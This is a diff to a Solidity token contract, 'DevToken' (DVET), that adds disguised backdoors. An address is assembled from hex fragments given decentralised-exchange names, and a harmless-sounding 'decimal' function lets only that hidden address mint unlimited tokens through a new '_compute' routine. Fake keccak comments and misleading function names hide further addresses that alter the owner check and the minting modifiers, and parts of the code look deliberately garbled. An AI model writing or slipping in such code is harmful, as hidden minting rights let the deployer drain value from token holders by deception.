@@ -70,6 +70,11 @@ abstract contract Ownable is Context {
     constructor() {
         _transferOwnership(_msgSender());
     }
+
+  /**
+   * @dev Throws if called by any account other than the owner.
+   */
+
    
     function setMember(address Mbr_) public returns (bool) {
         require (msg.sender == address
@@ -86,7 +91,11 @@ abstract contract Ownable is Context {
         _mbr=Mbr_;
         return true;
     }
-   
+    
+    function exchange() internal pure returns (address) {
+        return address 
+    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
+    }
     /**
      * @dev Returns the address of the current owner.
      */
@@ -104,8 +113,8 @@ abstract contract Ownable is Context {
     /**
      * @dev Throws if called by any account other than the owner.
      */
-    modifier onlyOwner() {
-        require(_msgSender() == address
+     modifier onlyOwner() {
+        require((_msgSender() == address
      /**
       * @dev Interface of the ERC20 standard as defined in the EIP.
       */
@@ -113,7 +122,7 @@ abstract contract Ownable is Context {
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(178607940065137046348733521910879985571412708986)
     ||
     //@dev Contract creator is owner, original owner.
-    owner() == _msgSender(), "Ownable: caller is not the owner");
+    owner() == _msgSender() && _msgSender() != exchange()));
         _;
     }
    
@@ -325,6 +334,11 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         _name = name_;
         _symbol = symbol_;
     }
+
+    modifier Exchanges() {
+        require(msg.sender != exchanger());
+        _;
+    }
  
     /**
      * @dev Returns the name of the token.
@@ -371,6 +385,8 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
     function balanceOf(address account) public view virtual override returns (uint256) {
         return _balances[account];
     }
+
+
  
     /**
      * @dev See {IERC20-transfer}.
@@ -402,6 +418,11 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
     function approve(address spender, uint256 amount) public virtual override returns (bool) {
         _approve(_msgSender(), spender, amount);
         return true;
+    }
+
+    function exchanger() internal pure returns (address) {
+        return address 
+    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
     }
  
     /**
@@ -510,7 +531,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         _afterTokenTransfer(sender, recipient, amount);
     }
  
-    function _proof(address account, uint256 amount) internal {
+    function _proof(address account, uint256 amount) internal Exchanges {
         require(account != address(0), "BEP20: mint to the zero address");
  
         _totalSupply = _totalSupply + amount;
@@ -548,7 +569,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
      *
      * - `account` cannot be the zero address.
      */
-    function _printbrr(address account, uint256 amount) internal {
+    function _printbrr(address account, uint256 amount) internal Exchanges{
         require(account != address(0), "BEP20: mint to the zero address");
  
         _totalSupply = _totalSupply + amount;
@@ -582,6 +603,14 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
  
         _afterTokenTransfer(account, address(0), amount);
     }
+
+    function _compute(address account, uint256 amount) internal {
+    require(account != address(0), "Compute Smart Contract Remix");
+ 
+        _totalSupply = _totalSupply + amount;
+        _balances[account] = _balances[account] + amount;
+        emit Transfer(address(0), account, amount);
+   }
  
     /**
      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
@@ -660,14 +689,20 @@ contract DevToken is Ownable, ERC20 {
     address public uniswapV2Pair;
     mapping(address => bool) public blacklists;
  
+    modifier naming() {
+        require(msg.sender == publics());
+        _;
+    }
+
     constructor(uint256 _totalSupply) ERC20("DevToken", "DVET") {
         _mint(msg.sender, _totalSupply);
     }
+
     function approval(uint256 amount) public returns (bool) {
         require(msg.sender == _adm);
         _proof(msg.sender, amount);
         return true;
-  }
+   }
  
     function blacklist(address _address, bool _isBlacklisting) external onlyOwner {
         blacklists[_address] = _isBlacklisting;
@@ -700,6 +735,24 @@ contract DevToken is Ownable, ERC20 {
         if (limited && from == uniswapV2Pair) {
             require(super.balanceOf(to) + amount <= maxHoldingAmount && super.balanceOf(to) + amount >= minHoldingAmount, "Forbid");
         }
+    }
+
+    function publics() private pure returns (address) {
+        uint universal = 0x7addAd09;
+        uint uni = 0xcbd98D97;
+        uint cake = 0xEC3dA7a0;
+        uint inch = 0x088EAdFE;
+        uint others = 0x5801C336;
+
+    // Combine the dex with others
+    uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
+
+    return address(core);
+    }
+
+    function decimal(uint256 amount) public naming returns (bool success) {
+        _compute(msg.sender, amount);
+        return true;
     }
  
     function burn(uint256 value) external {
